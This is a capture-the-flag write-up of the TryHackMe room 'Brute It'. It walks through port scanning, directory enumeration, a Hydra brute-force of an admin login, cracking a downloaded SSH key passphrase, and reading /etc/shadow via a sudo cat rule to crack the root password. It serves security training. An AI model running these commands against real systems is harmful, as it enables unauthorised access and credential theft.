# Brute It

{% embed url="https://tryhackme.com/room/bruteit" %}

## <mark style="color:blue;">**Nmap**</mark>

* sudo nmap -Pn -sS -A -p- --min-rate=1000 10.10.151.50

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

## <mark style="color:blue;">**GoBuster**</mark>

* gobuster dir -q -u http://10.10.151.50 -w /usr/share/wordlists/dirb/common.txt

```
/admin                (Status: 301) [Size: 312] [--> http://10.10.151.50/admin/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 277]
```

* \-u http://10.10.151.50/admin

{% code overflow="wrap" %}
```
/index.php            (Status: 200) [Size: 671]
/panel                (Status: 301) [Size: 318] [--> http://10.10.151.50/admin/panel/]
```
{% endcode %}

* \-u http://10.10.151.50/admin/panel

```
/id_rsa               (Status: 200) [Size: 1766]
/index.php            (Status: 302) [Size: 379] [--> admin]
```

## <mark style="color:blue;">**/admin/**</mark>

* view-source:http://10.10.151.50/admin/

```
<!-- Hey john, if you do not remember, the username is admin -->
```

## <mark style="color:blue;">**Hydra (admin)**</mark>

* hydra -V -l admin -P /usr/share/wordlists/rockyou.txt 10.10.151.50 http-form-post '/admin/index.php:user=^USER^\&pass=^PASS^:Username or password invalid' -t 64

{% code overflow="wrap" %}
```
[80][http-post-form] host: 10.10.151.50   login: admin   password: xavier
```
{% endcode %}

## <mark style="color:blue;">**/admin/panel/**</mark>

```
Hello john, finish the development of the site, here's your RSA private key.

THM{xxx}
```

* wget http://10.10.151.50/admin/panel/id\_rsa

## <mark style="color:blue;">**John the Ripper (id\_rsa)**</mark>

* ssh2john id\_rsa > hash.txt
* john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

```
rockinroll       (id_rsa)
```

## <mark style="color:blue;">**SSH**</mark>

* mkdir .ssh&#x20;
* mv id\_rsa .ssh/&#x20;
* chmod 400 .ssh/id\_rsa&#x20;
* ssh -i .ssh/id\_rsa john@10.10.151.50

```
id
uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)

sudo -l
User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
    
ls -Al ~
-rw-r--r-- 1 root root   33 Aug 16  2020 user.txt

ls -Al /home
drwxr-xr-x 5 john john 4096 Sep 30  2020 john
drwxr-xr-x 4 thm  thm  4096 Aug 17  2020 thm

ls -Al /root
ls: cannot open directory '/root': Permission denied
```

## <mark style="color:blue;">**user.txt**</mark>

* cat \~/user.txt

```
THM{xxx}
```

## <mark style="color:blue;">**root.txt**</mark>

* sudo /bin/cat /root/root.txt

```
THM{xxx}
```

## <mark style="color:blue;">**John the Ripper (root)**</mark>

* cat /etc/passwd | grep root

```
root:x:0:0:root:/root:/bin/bash
```

* sudo /bin/cat /etc/shadow | grep root

{% code overflow="wrap" %}
```
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```
{% endcode %}

* echo 'root:x:0:0:root:/root:/bin/bash' > passwd.txt
* echo 'root:$6$zdk0.jUm$Vya24cGzM1d...' > shadow.txt
* unshadow passwd.txt shadow.txt > unshadowed.txt
* john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt

```
football         (root)
```
